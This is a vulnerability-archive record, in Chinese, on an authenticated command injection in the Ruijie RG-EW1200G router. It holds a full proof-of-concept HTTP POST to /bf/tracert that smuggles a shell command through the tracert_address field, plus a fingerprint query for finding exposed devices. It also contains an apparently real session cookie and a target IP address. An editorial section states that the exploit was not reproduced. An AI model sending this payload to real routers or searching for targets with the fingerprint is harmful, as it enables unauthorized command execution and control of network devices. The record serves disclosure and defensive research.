---
source: "wy876 漏洞文库"
id: "vw-7f2b0513f82e569a216bb18f"
entity_id: "ve-7f2b0513f82e569a216bb18f"
schema_version: "1"
title: "锐捷RG-EW1200G路由器后台命令执行"
product: "Ruijie RG-EW1200G"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "有效bcrsession，固件未给"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7RG-EW1200G%E8%B7%AF%E7%94%B1%E5%99%A8%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/vmp57vmo35od9v3c"
source_status: "recorded"
---

# 锐捷RG-EW1200G路由器后台命令执行

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie RG-EW1200G
- 本文讨论：bf/tracert tracert_address命令注入
- 版本、权限与配置前提：有效bcrsession，固件未给
- 资料类型：后台诊断PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 含空图片`&#33;[]()`，这是正文未提供地址而非工作区图片省略
- 无结果或源码
- 不能直接称控制内部网络，尚需其他环境条件
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 实际固件及权限待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# <font style="color:rgba(0, 0, 0, 0.9);">一、漏洞简介</font>
<font style="color:rgba(0, 0, 0, 0.9);">锐捷网络RG-EW1200G 存在后台命令执行漏洞，登录路由器后，可执行任意命令，控制内部网络</font>

# 二、影响版本
+ <font style="color:rgba(0, 0, 0, 0.9);">RG-EW1200G无线路由器</font>

# 三、资产测绘
```plain
body="/static/js/app.09df2a9e44ab48766f5f.js"
```


+ 登录页面


# 四、漏洞复现
```http
POST /bf/tracert HTTP/1.1
Host: 
Content-Length: 53
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://175.167.44.37:6060
Referer: http://175.167.44.37:6060/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: bcrsession=f1d7956e195d123d8f0b4a6670553a7cda05348636f998dddeff1d3f3fe1fc8d87ed86b4b4818536
Connection: close

{"tracert_address":"||echo `id`","is_first_req":true}
```

`![]()`


> 资源说明：此处原归档的图片地址为空，以上保留原始占位语法；无法据此判断图片内容，未猜补地址。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vmp57vmo35od9v3c>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
